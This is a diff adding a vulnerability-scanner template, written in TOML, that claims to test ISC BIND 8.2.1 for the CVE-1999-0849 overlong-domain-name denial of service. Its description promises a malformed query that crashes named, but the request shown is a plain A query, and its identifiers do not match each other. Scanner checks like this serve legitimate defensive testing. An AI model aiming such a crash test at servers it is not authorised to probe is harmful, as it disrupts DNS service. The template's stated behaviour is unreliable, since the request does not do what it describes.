@@ -1,0 +1,30 @@
+[info]
+author = "ave"
+description = "ISC BIND 8.2.1 及之前版本的 named 在处理超长域名（超过 maxdname 限制）的 DNS 查询时存在校验缺陷，远程攻击者发送畸形查询可导致 named 崩溃。本 PoC 通过向目标 53 端口发送包含超长域名的 DNS 查询请求，验证服务是否因处理异常而停止响应。"
+id = "POC-AVE-1999-0649"
+name = "CVE-1999-0849 BIND maxdname 拒绝服务 PoC"
+severity = "medium"
+tags = ["ave-1999-0649"]
+vuln_id = [
+    "CVE-1999-0849",
+    "AVE-1999-0649",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+dns_type = "A"
+path = "{{Hostname}}"
+protocol = "dns"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "Malformed",
+    "SERVFAIL",
+    "REFUSED",
+    "error",
+]
